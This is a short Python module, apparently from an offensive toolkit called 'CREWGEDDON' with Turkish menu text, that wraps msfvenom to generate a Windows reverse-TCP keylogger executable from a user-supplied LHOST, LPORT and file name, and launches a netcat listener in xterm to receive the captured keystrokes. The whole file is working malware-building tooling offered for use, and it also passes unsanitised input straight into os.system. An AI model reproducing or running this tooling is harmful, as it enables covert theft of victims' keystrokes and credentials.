from colorama import Fore
import time
import subprocess
import os

def keyLoggerSistem():
    print(Fore.GREEN + "[0]" + Fore.BLUE + " - Ana Menü")
    print(Fore.GREEN + "[1]" + Fore.BLUE + " - KeyLogger Oluşturun")
    print(Fore.GREEN + "[2]" + Fore.BLUE + " - Dinlemeyi Başlatın")
    keylogger_select = int(input(f"{Fore.CYAN}CREWGEDDON~#: {Fore.WHITE}"))
    if keylogger_select == 0:
        return keylogger_select
    elif keylogger_select == 1:
        ip_adress = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LHOST: ")
        port = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LPORT: "))
        exe_name = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Uygulama Adı: ")
        os.system(f"msfvenom -p windows/x64/keylogger/reverse_tcp LHOST={ip_adress} LPORT={port} -f exe > {exe_name}.exe")
        print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}{exe_name}.exe oluşturuldu ve crewgeddon/{exe_name}.exe bölümüne kayıt edildi.")
    elif keylogger_select == 2:
        port = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LPORT: "))
        print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Dinlenme başlatılıyor, lütfen bekleyin..")
        time.sleep(2)
        subprocess.Popen(
            [
                "xterm",
                "-T",
                "Crewgeddon - KeyLogger Dinleyicisi (Desktop)",
                "-hold",
                "-e",
                f"nc -nvlp {port}",
            ]
        )
    else:
        print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Geçersiz işlem belirttiniz.")
        return keylogger_select